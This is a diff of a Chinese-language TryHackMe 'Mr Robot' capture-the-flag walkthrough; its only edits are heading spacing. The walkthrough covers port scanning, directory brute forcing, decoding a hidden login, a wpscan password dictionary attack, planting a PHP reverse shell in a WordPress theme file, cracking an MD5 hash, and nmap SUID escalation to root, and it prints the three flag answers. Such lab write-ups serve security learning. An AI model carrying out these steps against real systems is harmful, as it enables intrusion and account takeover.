@@ -1,7 +1,7 @@
-#服务发现
+# 服务发现
 ```
 ┌──(root💀kali)-[~/tryhackme/mrrobot]
-└─# nmap -sV -Pn 10.10.180.172 -p-  
+└─#  nmap -sV -Pn 10.10.180.172 -p-  
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 02:33 EDT
 Nmap scan report for 10.10.180.172
@@ -16,26 +16,26 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 398.37 seconds
 ```
 
-#检查http://10.10.180.172/robots.txt，显示两个文件
+# 检查http://10.10.180.172/robots.txt，显示两个文件
 ```
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 ```
 
-#打开http://10.10.180.172/key-1-of-3.txt，找到key 1
+# 打开http://10.10.180.172/key-1-of-3.txt，找到key 1
 ```
 073403c8a58a1f80d943455fb30724b9
 ```
 
-#fsocity.dic下载下来，像是一个字典文件,可能是登陆密码字典，那么现在需要的是一个可登陆的用户名？
+# fsocity.dic下载下来，像是一个字典文件,可能是登陆密码字典，那么现在需要的是一个可登陆的用户名？
 
 
 
-#目录爆破
+# 目录爆破
 ```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u "http://10.10.180.172"  -e* -t 100  
+└─#  python3 dirsearch.py -u "http://10.10.180.172"  -e* -t 100  
 
  _|. _ _  _  _  _ _|_    v0.3.8                                                                                                                                                                                                             
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                      
@@ -125,10 +125,10 @@ Target: http://10.10.180.172
 [03:52:38] 301 -    0B  - /wp-register.php  ->  http://10.10.180.172/wp-login.php?action=register
 [03:52:51] 405 -   42B  - /xmlrpc.php  
 ```
-#wpscan挖掘wordpress信息，没什么有用的信息，枚举authid也无法爆破wordpress用户名
+# wpscan挖掘wordpress信息，没什么有用的信息，枚举authid也无法爆破wordpress用户名
 ```
 ┌──(root💀kali)-[~/tryhackme/mrrobot]
-└─# wpscan --url http://10.10.180.172        
+└─#  wpscan --url http://10.10.180.172        
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -221,7 +221,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:22:17
 ```
 
-#首页命令行支持6个命令，研究了半天，没看到有什么有用的信息
+# 首页命令行支持6个命令，研究了半天，没看到有什么有用的信息
 ```
 prepare    --->显示动画：whoismyrobot.com
 fsociety   --->显示动画：are you ready to join fsociety
@@ -232,25 +232,25 @@ join	   --->留下一个邮箱
 ```
 
 
-#在http://10.10.180.172/license.txt，打开f12，找到base64加密过的隐藏线索
+# 在http://10.10.180.172/license.txt，打开f12，找到base64加密过的隐藏线索
 ```
-what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
+what you do just pull code from Rapid9 or some s@# % since when did you become a script kitty?
 do you want a password or something?
 ZWxsaW90OkVSMjgtMDY1Mgo=
 ```
 
-#解密后：
+# 解密后：
 ```
 elliot:ER28-0652
 ```
 
-#登陆进去以后，在users里收集到两个用户名和邮箱
+# 登陆进去以后，在users里收集到两个用户名和邮箱
 ```
 elliot     Elliot Alderson	  elliot@mrrobot.com
 mich05654  krista Gordon	  kgordon@therapist.com
 ```
 
-#用下载的字典爆破mich05654账号
+# 用下载的字典爆破mich05654账号
 ```
 wpscan --url http://10.10.180.172/ --usernames mich05654 --passwords /root/tryhackme/mrrobot/fsocity.dic
 
@@ -258,9 +258,9 @@ wpscan --url http://10.10.180.172/ --usernames mich05654 --passwords /root/tryha
  | Username: mich05654, Password: Dylan_2791
 ```
 
-#然而登陆进去好像没什么有用的信息？
+# 然而登陆进去好像没什么有用的信息？
 
-#回到elliot登录界面
+# 回到elliot登录界面
 在后台页面 Appearace->Theme Editer可以编辑在使用皮肤里面的php代码，我们选择404.php这个文件，上传一个反弹shell
 使用这个payload ：
 ```https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```
@@ -269,7 +269,7 @@ wpscan --url http://10.10.180.172/ --usernames mich05654 --passwords /root/tryha
 在前台页面随便输入一个不存在的页面，触发反弹shell    -->http://10.10.180.172/asdasddasdas
 
 
-#在/home/robot目录找到key-2-of-3.txt文件，但是webshell没有读权限
+# 在/home/robot目录找到key-2-of-3.txt文件，但是webshell没有读权限
 在同目录找到一个哈希文件
 ```
 $ ls -alh
@@ -285,10 +285,10 @@ robot:c3fcd3d76192e4007dfb496cca67e13b
 
 ```
 
-#把哈希文件保存到靶机的hash.txt，用jonn爆破
+# 把哈希文件保存到靶机的hash.txt，用jonn爆破
 ```
 ┌──(root💀kali)-[~/tryhackme/mrrobot]
-└─# john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+└─#  john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
 Warning: no OpenMP support for this hash type, consider --fork=4
@@ -299,7 +299,7 @@ Use the "--show --format=Raw-MD5" options to display all of the cracked password
 Session completed
 ```
 
-#密码：abcdefghijklmnopqrstuvwxyz，切换到tty以后su robot，查看key-2-of-3.txt
+# 密码：abcdefghijklmnopqrstuvwxyz，切换到tty以后su robot，查看key-2-of-3.txt
 ```
 $ su robot
 su robot
@@ -312,7 +312,7 @@ robot@linux:~$
 
 ```
 
-#根据提示，查看nmap权限，发现是一个suid
+# 根据提示，查看nmap权限，发现是一个suid
 ```
 robot@linux:~$ whereis nmap
 whereis nmap
@@ -323,7 +323,7 @@ ls -al /usr/local/bin/nmap
 
 ```
 
-#根据GTFPbins里nmap的提权方法，这里采用shell-b方法提升到root权限，拿到key-3-of-3.txt
+# 根据GTFPbins里nmap的提权方法，这里采用shell-b方法提升到root权限，拿到key-3-of-3.txt
 ```
 robot@linux:~$ nmap --interactive
 nmap --interactive
@@ -332,10 +332,10 @@ Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh
 !sh
-# id
+#  id
 id
 uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
-# ls -alh /root 
+#  ls -alh /root 
 ls -alh /root
 total 32K
 drwx------  3 root root 4.0K Nov 13  2015 .
@@ -347,9 +347,9 @@ drwx------  2 root root 4.0K Nov 13  2015 .cache
 -r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
 -rw-r--r--  1 root root  140 Feb 20  2014 .profile
 -rw-------  1 root root 1.0K Sep 16  2015 .rnd
-# cat /root/key-3-of-3.txt
+#  cat /root/key-3-of-3.txt
 cat /root/key-3-of-3.txt
 04787ddef27c3dee1ee161b21670b4e4
-# 
+#  
 ```
 
